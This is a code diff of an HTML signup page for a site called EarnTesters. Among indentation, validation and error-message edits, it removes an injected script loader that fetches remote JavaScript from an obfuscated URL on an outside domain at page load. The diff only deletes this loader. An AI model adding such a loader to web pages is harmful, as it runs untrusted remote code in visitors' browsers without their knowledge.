@@ -199,7 +199,7 @@
             <a href="/" class="logo">Earn<span>Testers</span></a>
             <div>
                 <a href="/about.html" class="link">About Us</a>
-            <a href="index.html" class="back-link">JoshGG</a>
+                <a href="index.html" class="back-link">JoshGG</a>
             </div>
         </div>
     </div>
@@ -289,18 +289,6 @@
     </div>
     
     <script>
-(function(vhptzi){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = vhptzi || {};
-s.src = "\/\/untimely-hello.com\/beXeVRsAd.G\/lC0uY\/W-cn\/ae\/mB9AutZxUylzkePxTeYc4BNnTzQIw-MgDykUt\/NUjfgT1\/N\/DyAqxYMRwK";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-
-        const usersLS = JSON.parse(localStorage.getItem('tester-use'));
         document.getElementById('testerSignupForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -317,7 +305,7 @@ l.parentNode.insertBefore(s, l);
             // Get selected interests (checkboxes)
             const interests = Array.from(document.querySelectorAll('input[type="checkbox"]:checked'))
                 .map(cb => cb.value)
-                .filter(v => v); // Filter out the terms checkbox
+                .filter(v => v && v !== 'on'); // Filter out empty and 'on' values
             
             // Validate required fields
             if (!fullName || !email || devices.length === 0 || !personality) {
@@ -389,15 +377,11 @@ l.parentNode.insertBefore(s, l);
                 console.error('Error:', error);
                 const messageEl = document.getElementById('formMessage');
                 messageEl.className = 'message error';
-                messageEl.textContent = 'Network error. Please check your connection.';
+                messageEl.textContent = 'Signup failed. Please try again.';
                 btn.textContent = originalText;
                 btn.disabled = false;
             }
         });
-        
-        if (usersLS) {
-            document.getElementById('testerSignUpForm').style.display = 'none';   
-        }
     </script>
 </body>
 </html>
